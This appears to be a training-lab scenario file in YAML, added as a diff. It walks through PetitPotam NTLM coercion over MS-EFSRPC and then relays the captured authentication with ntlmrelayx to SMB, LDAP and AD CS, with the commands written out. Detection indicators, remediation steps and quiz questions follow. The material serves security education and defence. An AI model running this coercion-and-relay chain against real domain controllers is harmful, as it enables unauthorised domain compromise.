@@ -1,0 +1,143 @@
+# Category: Active Directory - Coercion
+name: "PetitPotam — NTLM Relay Coercion via MS-EFSRPC"
+id: "ad-coercion-petitpotam-001"
+category: "active_directory"
+subcategory: "coercion"
+difficulty: "intermediate"
+estimated_time: "30 minutes"
+
+description: |
+  Coerce Windows hosts, including domain controllers, to authenticate to an
+  attacker-controlled server using the MS-EFSRPC (Encrypting File System
+  Remote Protocol). By abusing legitimate EFSRPC functions, an unauthenticated
+  attacker can force a target machine to send its NetNTLM authentication
+  to a specified IP, enabling NTLM relay attacks without user interaction.
+
+learning_objectives:
+  - Understand MS-EFSRPC and its authentication behavior
+  - Coerce authentication from domain controllers using PetitPotam
+  - Relay coerced authentication for domain compromise
+  - Apply mitigations to prevent coercion attacks
+
+tools:
+  - petitpotam.py
+  - ntlmrelayx.py (impacket)
+  - responder
+  - impacket
+  - metasploit
+
+prerequisites:
+  - Network access to target (RPC port 135 or dynamic RPC)
+  - Target must have MS-EFSRPC accessible
+  - Attacker-controlled server for relay
+  - NTLM relay setup ready
+
+steps:
+  - id: "step1"
+    phase: "reconnaissance"
+    action: "Verify MS-EFSRPC is accessible on target"
+    commands:
+      - "# Check if EFSRPC is exposed"
+      - "rpcclient -U '' [target_ip] -c 'srvinfo'"
+      - "# Check RPC endpoints"
+      - "impacket-rpcdump [target_ip] | grep -i efs"
+      - "# Nmap RPC enumeration"
+      - "nmap -p 135 --script=rpc-grind [target_ip]"
+      - "# Check for PetitPotam mitigations"
+      - "reg query \\\\[target_ip]\\HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RestrictRemoteSAM"
+    expected_output: "MS-EFSRPC endpoint confirmed accessible"
+    detection: "RPC endpoint enumeration"
+
+  - id: "step2"
+    phase: "exploitation"
+    action: "Coerce authentication using PetitPotam"
+    commands:
+      - "# Basic coercion"
+      - "python3 PetitPotam.py [attacker_ip] [target_ip]"
+      - "# Coerce specific target"
+      - "python3 PetitPotam.py [attacker_ip] [target_ip] -u [username] -p [password] -d [domain]"
+      - "# Alternative EFSRPC functions"
+      - "python3 PetitPotam.py -d [domain] -u [username] -p [password] [attacker_ip] [target_ip] -f EfsRpcOpenFileRaw"
+      - "# Coerce multiple targets"
+      - "for ip in $(cat targets.txt); do python3 PetitPotam.py [attacker_ip] $ip; done"
+    expected_output: "Target sends NTLM authentication to attacker IP"
+    detection: "EFSRPC calls from unexpected sources"
+
+  - id: "step3"
+    phase: "post_exploitation"
+    action: "Relay coerced authentication"
+    commands:
+      - "# ntlmrelayx for relay"
+      - "ntlmrelayx.py -t smb://[relay_target] -smb2support -c 'whoami'"
+      - "# Relay to LDAP for RBCD"
+      - "ntlmrelayx.py -t ldap://[dc_ip] --delegate-access --escalate-user [username]"
+      - "# Relay to AD CS for certificate"
+      - "ntlmrelayx.py -t http://[ca_server]/certsrv/certfnsh.asp --adcs"
+      - "# Full chain: coerce DC, relay to LDAP, create computer account"
+      - "# Terminal 1: ntlmrelayx.py -t ldaps://[dc_ip] --add-computer FAKEPC01"
+      - "# Terminal 2: python3 PetitPotam.py [attacker_ip] [dc_ip]"
+    expected_output: "Successful relay; account created or certificate obtained"
+    detection: "NTLM relay from DC to attacker; LDAP modifications"
+
+compliance_controls:
+  - standard: "MITRE ATT&CK"
+    control: "T1187"
+    description: "Forced Authentication"
+  - standard: "MITRE ATT&CK"
+    control: "T1557"
+    description: "Man-in-the-Middle"
+  - standard: "NIST 800-53 Rev5"
+    control: "SC-8"
+    description: "Transmission Confidentiality and Integrity"
+  - standard: "CIS Controls v8"
+    control: "12.1"
+    description: "Ensure that only approved ports, protocols, and services are running"
+
+detection:
+  network_indicators:
+    - "MS-EFSRPC calls from non-EFS clients"
+    - "SMB authentication from DC to non-DC systems"
+  log_indicators:
+    - "Event ID 4648: Explicit Credential Logon"
+    - "Event ID 4768: Kerberos TGT request after NTLM relay"
+    - "Security Event ID 5140: Network share accessed"
+  endpoint_indicators:
+    - "PetitPotam.py execution"
+    - "EFSRPC activity on non-EFS systems"
+    - "Unexpected NTLM authentication from DC"
+
+remediation:
+  immediate:
+    - "Enable EPA and SMB signing"
+    - "Block RPC from untrusted sources"
+    - "Apply patches for CVE-2021-36942"
+    - "Enable NTLM auditing"
+  long_term:
+    - "Implement RPC filters and firewalls"
+    - "Use authenticated RPC"
+    - "Deploy network segmentation"
+    - "Monitor for coercion patterns"
+
+variables:
+  domain: "corp.example.com"
+  target_ip: "192.168.1.10"
+  attacker_ip: "192.168.1.50"
+  relay_target: "192.168.1.100"
+  dc_ip: "192.168.1.10"
+  ca_server: "ca01.corp.example.com"
+  username: "jsmith"
+  password: "Password123"
+
+assessment_questions:
+  - "How does PetitPotam differ from PrinterBug for coercion?"
+  - "What RPC function does PetitPotam abuse?"
+  - "Why is coercing a DC particularly dangerous?"
+  - "What patch mitigates PetitPotam?"
+
+references:
+  - url: "https://github.com/topotam/PetitPotam"
+    title: "PetitPotam - GitHub"
+  - url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942"
+    title: "Microsoft CVE-2021-36942 Advisory"
+  - url: "https://attack.mitre.org/techniques/T1187/"
+    title: "MITRE ATT&CK - Forced Authentication"
